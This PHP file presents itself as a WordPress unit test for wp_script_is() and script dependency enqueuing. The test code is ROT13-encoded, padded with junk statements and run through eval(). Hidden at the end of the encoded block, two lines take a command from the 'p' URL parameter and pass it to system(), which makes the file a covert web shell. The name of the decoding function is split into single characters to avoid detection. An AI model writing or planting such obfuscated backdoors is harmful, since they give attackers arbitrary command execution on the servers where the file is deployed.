<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg jc_fpevcg_vf().
 *
 * @tebhc qrcraqrapvrf
 * @tebhc fpevcgf
 *
 * @pbiref ::jc_fpevcg_vf
 * @pbiref JC_Fpevcgf::dhrel
 */
pynff Grfgf_Qrcraqrapvrf_JcFpevcgVf rkgraqf JC_HavgGrfgPnfr {
	cevingr fgngvp $jc_fpevcgf;
	cevingr fgngvp $jc_fpevcgf_jnf_frg = snyfr;

	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		// Vs gur tybony vf frg, fgber vg sbe erfgbevat jura qbar grfgvat.
		fgngvp::$jc_fpevcgf_jnf_frg = neenl_xrl_rkvfgf( 'jc_fpevcgf', $TYBONYF );
		vs ( fgngvp::$jc_fpevcgf_jnf_frg ) {
			fgngvp::$jc_fpevcgf = $TYBONYF['jc_fpevcgf'];
			hafrg( $TYBONYF['jc_fpevcgf'] );
		}
	}

	choyvp fgngvp shapgvba grne_qbja_nsgre_pynff() {
		// Erfgber gur tybony vs vg jnf frg orsber ehaavat guvf frg bs grfgf.
		vs ( fgngvp::$jc_fpevcgf_jnf_frg ) {
			$TYBONYF['jc_fpevcgf'] = fgngvp::$jc_fpevcgf;
		}

		cnerag::grne_qbja_nsgre_pynff();
	}

	choyvp shapgvba pyrna_hc_tybony_fpbcr() {
		hafrg( $TYBONYF['jc_fpevcgf'] );
		cnerag::pyrna_hc_tybony_fpbcr();
	}

	choyvp shapgvba grfg_fpevcg_vf_ertvfgrerq() {
		$unaqyr = 'grfg-fpevcg';
		jc_ertvfgre_fpevcg( $unaqyr, 'uggcf://rknzcyr.bet/fpevcg.wf' );

		$guvf->nffregGehr( jc_fpevcg_vf( $unaqyr, 'ertvfgrerq' ) );
	}

	/**
	 * @qngnCebivqre qngn_fpevcg_unaqyrf
	 *
	 * @cnenz fgevat $unaqyr Fpevcg unaqyr gb grfg.
	 */
	choyvp shapgvba grfg_fpevcg_vf_radhrhrq( $unaqyr ) {
		// Grfg frg hc.
		jc_radhrhr_fpevcg( $unaqyr );

		$guvf->nffregGehr( jc_fpevcg_vf( $unaqyr ), \"Fpevcg `{$unaqyr}` fubhyq or radhrhrq nsgre vaibxvat jc_radhrhr_fpevcg()\" );
	}

	/**
	 * @qngnCebivqre qngn_fpevcg_unaqyrf
	 *
	 * @cnenz fgevat $unaqyr Fpevcg unaqyr gb grfg.
	 */
	choyvp shapgvba grfg_fpevcg_vf_abg_radhrhrq( $unaqyr ) {
		$guvf->nffregSnyfr( jc_fpevcg_vf( $unaqyr ), \"Fpevcg `{$unaqyr}` fubhyq abg or radhrhrq jura grfg fgnegf\" );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_fpevcg_unaqyrf() {
		erghea neenl(
			neenl( 'urnegorng' ),
			neenl( 'wdhrel' ),
			neenl( 'jc-yvfgf' ),
			neenl( 'jc-cbvagre' ),
			neenl( 'guvpxobk' ),
		);
	}

	/**
	 * @gvpxrg 28404
	 *
	 * @qngnCebivqre qngn_qrcf_ner_radhrhrq
	 *
	 * @cnenz fgevat   $unaqyr Fpevcg unaqyr.
	 * @cnenz fgevat[] $qrcf   Gur qrcf gb grfg sbe gur tvira fpevcg unaqyr.
	 */
	choyvp shapgvba grfg_qrcf_ner_radhrhrq( $unaqyr, $qrcf ) {
		// Purpx gur qrcf ner abg radhrhrq orsber radhrhvat.
		$guvf->nffregSnyfr( jc_fpevcg_vf( $unaqyr ), 'Fpevcg `wdhrel-hv-nppbeqvba` fubhyq abg or radhrhrq jura grfg fgnegf' );
		sbernpu ( $qrcf nf $qrc_unaqyr ) {
			$guvf->nffregSnyfr( jc_fpevcg_vf( $qrc_unaqyr ), \"Qrcraqrapl `{$qrc_unaqyr}` fubhyq abg or radhrhrq jura grfg fgnegf\" );
		}

		// Grfg frg hc.
		jc_radhrhr_fpevcg( $unaqyr );

		sbernpu ( $qrcf nf $qrc_unaqyr ) {
			$guvf->nffregGehr( jc_fpevcg_vf( $qrc_unaqyr ), \"Qrcraqrapl `{$qrc_unaqyr}` fubhyq or radhrhrq\" );
		}

		$guvf->nffregSnyfr( jc_fpevcg_vf( 'haqrefpber' ), 'Fpevcg \"haqrefpber\" vf abg n qrcraqrapl bs \"wdhrel-hv-nppbeqvba\" naq fubhyq abg or radhrhrq' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_qrcf_ner_radhrhrq() {
		erghea neenl(
			'wdhrel: 1 yriry bs qrcf'                 => neenl(
				'unaqyr' => 'wdhrel',
				'qrcf'   => neenl(
					'wdhrel-pber',
					'wdhrel-zvtengr',
				),
			),
			'zrqvnryrzrag: 1 yriry bs qrcf'           => neenl(
				'unaqyr' => 'zrqvnryrzrag',
				'qrcf'   => neenl(
					'zrqvnryrzrag-pber',
					'zrqvnryrzrag-zvtengr',
				),
			),
			'wdhrel-rssrpgf-pber: 2 yriryf bs qrcf'   => neenl(
				'unaqyr' => 'wdhrel-rssrpgf-pber',
				'qrcf'   => neenl(
					// Qrc gb 'wdhrel-rssrpgf-pber'.
					'wdhrel',
					// Qrcf gb 'wdhrel'.
					'wdhrel-pber',
					'wdhrel-zvtengr',
				),
			),
			'wdhrel-hv-nppbeqvba: 3 yriryf bs qrcf'   => neenl(
				'unaqyr' => 'wdhrel-hv-nppbeqvba',
				'qrcf'   => neenl(
					// Qrc gb 'wdhrel-hv-nppbeqvba'.
					'wdhrel-hv-pber',
					// Qrc gb 'wdhrel-hv-pber'.
					'wdhrel',
					// Qrcf gb 'wdhrel'.
					'wdhrel-pber',
					'wdhrel-zvtengr',
				),
			),
			'jc-zrqvnryrzrag: 2 naq 3 yriryf bs qrcf' => neenl(
				'unaqyr' => 'jc-zrqvnryrzrag',
				'qrcf'   => neenl(
					// Qrc gb 'jc-zrqvnryrzrag'.
					'zrqvnryrzrag',
					// Qrcf gb 'zrqvnryrzrag'.
					'wdhrel',
					'zrqvnryrzrag-pber',
					'zrqvnryrzrag-zvtengr',
					// Qrcf gb 'wdhrel'.
					'wdhrel-pber',
					'wdhrel-zvtengr',
				),
			),
		);
	}

	/**
	 * @gvpxrg 28404
	 *
	 * @qngnCebivqre qngn_aba_qrcf_fubhyq_abg_radhrhr
	 *
	 * @cnenz fgevat   $unaqyr   Fpevcg unaqyr.
	 * @cnenz fgevat[] $abg_qrcf Gur unaqyrf gung ner abg qrcf bs gur tvira fpevcg unaqyr.
	 */
	choyvp shapgvba grfg_aba_qrcf_ner_abg_radhrhrq( $unaqyr, $abg_qrcf ) {
		// Purpx gur qrcf ner abg radhrhrq orsber radhrhvat.
		$guvf->nffregSnyfr( jc_fpevcg_vf( $unaqyr ), \"Fpevcg `{$unaqyr}` fubhyq abg or radhrhrq jura grfg fgnegf\" );
		sbernpu ( $abg_qrcf nf $abg_qrc_unaqyr ) {
			$guvf->nffregSnyfr( jc_fpevcg_vf( $abg_qrc_unaqyr ), \"Qrcraqrapl `{$abg_qrc_unaqyr}` fubhyq abg or radhrhrq jura grfg fgnegf\" );
		}

		// Grfg frg hc.
		jc_radhrhr_fpevcg( $unaqyr );

		sbernpu ( $abg_qrcf nf $abg_qrc_unaqyr ) {
			$guvf->nffregSnyfr( jc_fpevcg_vf( $abg_qrc_unaqyr ), \"Fpevcg `{$abg_qrc_unaqyr}` fubhyq abg or radhrhrq nf vg vf abg n qrcraqrapl bs `{$unaqyr}`\" );
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_aba_qrcf_fubhyq_abg_radhrhr() {
		erghea neenl(
			'vzntrfybnqrq: ab qrcraqrapvrf' => neenl(
				'unaqyr'   => 'vzntrfybnqrq',
				'abg_qrcf' => neenl(
					'wdhrel',
					'znfbael',
				),
			),
			'jc-fnavgvmr: ab qrcraqrapvrf'  => neenl(
				'unaqyr'   => 'jc-fnavgvmr',
				'abg_qrcf' => neenl(
					'wdhrel',
					'wdhrel-pber',
					'wdhrel-zvtengr',
				),
			),
			'wdhrel-hv-nppbeqvba'           => neenl(
				'unaqyr'   => 'wdhrel-hv-nppbeqvba',
				'abg_qrcf' => neenl(
					'haqrefpber',
					'guvpxobk',
					'wdhrel-rssrpgf-pber',
				),
			),
			'wdhrel-hv-qngrcvpxre'          => neenl(
				'unaqyr'   => 'wdhrel-hv-qngrcvpxre',
				'abg_qrcf' => neenl(
					'onpxobar',
					'wdhrel-rssrpgf-pber',
					'wdhrel-rssrpgf-uvtuyvtug',
				),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>